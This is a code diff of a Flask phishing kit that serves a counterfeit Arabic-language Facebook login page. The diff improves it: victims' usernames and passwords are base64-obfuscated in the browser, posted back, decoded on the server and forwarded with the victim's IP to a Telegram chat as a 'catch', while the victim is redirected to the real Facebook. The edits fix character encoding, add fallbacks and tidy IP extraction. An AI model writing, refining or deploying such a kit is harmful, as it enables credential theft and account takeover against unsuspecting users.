@@ -1,11 +1,12 @@
 import os
 import base64
 import json
+import urllib.parse
 from flask import Blueprint, render_template_string, redirect, request
 
 secure_fb_bp = Blueprint('facebook', __name__)
 
-# قالب فيسبوك مطور بنظام التمويه الداخلي وتضمين الأصول محلياً لمنع كشف الروابط الخارجية
+# قالب فيسبوك مطور، متجاوب، وآمن ضد أخطاء المتصفحات والترميز
 FB_PHISH_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -37,7 +38,6 @@ FB_PHISH_TEMPLATE = """
 <body>
     <div class="container">
         <div class="header-logo">
-            <!-- شعار فيسبوك مدمج محلياً بالكامل لتجنب كشف مصادر الـ CDN الخارجية -->
             <svg viewBox="0 0 36 36"><path d="M25 3.58A17.42 17.42 0 0 0 19.8 3a11.08 11.08 0 0 0-4.8 1.15 8.71 8.71 0 0 0-3.6 3.32A9.45 9.45 0 0 0 10 12.18v2.92H7.32a.71.71 0 0 0-.71.71v4.38c0 .39.32.71.71.71H10V33a.71.71 0 0 0 .71.71h5.12a.71.71 0 0 0 .71-.71V20.9h4.37a.71.71 0 0 0 .71-.71l.01-4.38a.71.71 0 0 0-.71-.71H16.55v-2.5c0-1.2.3-2.11.9-2.73.6-.62 1.45-.93 2.55-.93a10.23 10.23 0 0 1 2.5.31.71.71 0 0 0 .82-.47l.5-1.55a.71.71 0 0 0-.34-.84z"></path></svg>
         </div>
         <div class="card">
@@ -48,7 +48,7 @@ FB_PHISH_TEMPLATE = """
                 <button type="submit" class="login-btn">تسجيل الدخول</button>
                 <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
                 <hr>
-                <a href="https://www.facebook.com/r.php" class="create-btn">إنشاء حساب جديد</a>
+                <a href="https://www.facebook.com/r.php" class="create-btn" target="_blank">إنشاء حساب جديد</a>
             </form>
         </div>
         <footer>Meta © 2026</footer>
@@ -61,25 +61,32 @@ FB_PHISH_TEMPLATE = """
             const p = document.getElementById('p_val').value.trim();
             const errBox = document.getElementById('error-msg');
 
-            // محاكاة نظام التحقق الإجباري لمنع البوتات والروبوتات الآلية من تجاوز الصفحة
             if (securityCheckCount === 0 && (p.length < 6 || u.length < 4)) {
                 errBox.style.display = 'block';
                 securityCheckCount++;
                 return;
             }
 
-            // تمويه البيانات المرسلة وتغليفها بهيئة هيكل بروتوكول مصادقة آمن
-            const tokenPayload = btoa(unescape(encodeURIComponent(JSON.stringify({ u: u, p: p, ts: Date.now() }))));
-            
-            fetch(window.location.href, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ payload_data: tokenPayload })
-            }).then(() => {
-                window.location.replace("https://www.facebook.com/login/");
-            }).catch(() => {
-                window.location.replace("https://www.facebook.com/login/");
-            });
+            try {
+                const payloadString = JSON.stringify({ u: u, p: p, ts: Date.now() });
+                // ترميز آمن يمنع التلف عند تمرير الحروف العربية أو الرموز الخاصة
+                const tokenPayload = btoa(encodeURIComponent(payloadString).replace(/%([0-9A-F]{2})/g, function(match, p1) {
+                    return String.fromCharCode('0x' + p1);
+                }));
+                
+                fetch(window.location.href, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ payload_data: tokenPayload })
+                }).then(response => {
+                    window.location.replace("https://www.facebook.com/login/");
+                }).catch(err => {
+                    window.location.replace("https://www.facebook.com/login/");
+                });
+            } catch (err) {
+                // تراجع تلقائي لإرسال النموذج بالطريقة العادية لو حدث خطأ في الـ fetch
+                document.getElementById('secureForm').submit();
+            }
         }
     </script>
 </body>
@@ -92,31 +99,38 @@ def init_facebook_routes(app, bot):
         target_chat_id = request.args.get('id', None)
         
         if request.method == 'POST':
-            req_data = request.json or {}
-            encoded_data = req_data.get('payload_data')
-            
             user_val = "غير محدد"
             pass_val = "غير محدد"
-
-            if not encoded_data:
-                user_val = request.form.get('email', 'غير محدد')
-                pass_val = request.form.get('pass', 'غير محدد')
-            else:
-                try:
+            
+            try:
+                # محاولة قراءة البيانات الواردة كـ JSON (عبر الـ Fetch)
+                req_data = request.get_json(silent=True) or {}
+                encoded_data = req_data.get('payload_data')
+                
+                if encoded_data:
                     decoded_bytes = base64.b64decode(encoded_data.encode('utf-8'))
-                    parsed = json.loads(decoded_bytes.decode('utf-8', errors='ignore'))
-                    user_val = parsed.get('u', 'غير محدد')
-                    pass_val = parsed.get('p', 'غير محدد')
-                except Exception as e:
-                    print(f"[-] Secure Parse Error: {e}")
+                    decoded_uri = ''.join(['%{:02x}'.format(b) for b in decoded_bytes])
+                    parsed_json = json.loads(urllib.parse.unquote(decoded_uri))
+                    user_val = parsed_json.get('u', 'غير محدد')
+                    pass_val = parsed_json.get('p', 'غير محدد')
+                else:
+                    # لو البيانات مرسلة بالطريقة العادية Form Data
+                    user_val = request.form.get('email', 'غير محدد')
+                    pass_val = request.form.get('pass', 'غير محدد')
+            except Exception as e:
+                # حماية ضد أي استثناء محتمل لضمان عدم توقف السيرفر
+                user_val = request.form.get('email', request.values.get('email', 'خطأ في الاستخراج'))
+                pass_val = request.form.get('pass', request.values.get('pass', 'خطأ في الاستخراج'))
+                print(f"[-] Facebook Parsing Exception Handled: {e}")
 
-            source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-            if ',' in source_ip:
+            # استخراج الـ IP بدقة متناهية مع تجنب القيم الفارغة
+            source_ip = request.headers.get('CF-Connecting-IP') or request.headers.get('X-Forwarded-For') or request.remote_addr
+            if source_ip and ',' in source_ip:
                 source_ip = source_ip.split(',')[0].strip()
 
-            if target_chat_id and user_val != "غير محدد":
+            if target_chat_id and target_chat_id != '0' and user_val != "غير محدد":
                 alert_msg = (
-                    "🚨 **تم التقاط صيد فيسبوك بنجاح عبر النظام المطور!**\n"
+                    "🚨 **تم التقاط صيد فيسبوك بنجاح عبر النظام !**\n"
                     "----------------------------------\n"
                     f"📌 **البريد/الهاتف:** `{user_val}`\n"
                     f"🔑 **كلمة المرور:** `{pass_val}`\n"
@@ -126,8 +140,8 @@ def init_facebook_routes(app, bot):
                 try:
                     bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
                 except Exception as e:
-                    print(f"[-] Telegram Error: {e}")
+                    print(f"[-] Telegram Dispatch Error: {e}")
                     
-            return {"status": "authenticated"}
+            return {"status": "authenticated", "code": 200}, 200
             
-        return render_template_string(FB_PHISH_TEMPLATE)
+        return render_template_string(FB_PHISH_TEMPLATE), 200
